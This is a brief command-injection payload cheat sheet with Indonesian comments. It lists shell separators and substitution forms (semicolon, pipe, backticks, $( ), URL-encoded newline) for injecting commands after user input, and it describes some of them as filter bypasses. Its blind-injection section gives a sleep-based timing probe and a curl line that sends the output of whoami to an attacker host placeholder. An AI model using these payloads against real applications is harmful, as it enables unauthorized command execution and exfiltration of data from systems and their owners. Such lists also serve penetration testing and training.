# Command Injection

## Separator (sisipkan setelah input)
```bash
; id       # Semicolon (Titik koma, mengeksekusi perintah setelahnya)
| id       # Pipe (Meneruskan output, sering mengabaikan perintah awal)
|| id      # OR (Dieksekusi HANYA jika perintah pertama GAGAL)
& id       # Background (Menjalankan perintah di latar belakang)
&& id      # AND (Dieksekusi HANYA jika perintah pertama BERHASIL)
`id`       # Backticks (Inline execution, mengeksekusi perintah di dalamnya lebih dulu)
$(id)      # Command substitution (Fungsinya sama persis seperti backticks)
%0a id     # URL-encoded Newline (Bypass filter dengan karakter enter/baris baru)
;id;       # Inline Semicolon (Menyisipkan perintah di tengah-tengah query target)
|id|       # Inline Pipe (Sama seperti semicolon, mengeksekusi di antara pipe)
```

## Blind (no output)
Exfil via DNS/HTTP atau time-based:
```bash
; sleep 5
; curl http://<LHOST>/$(whoami)
```
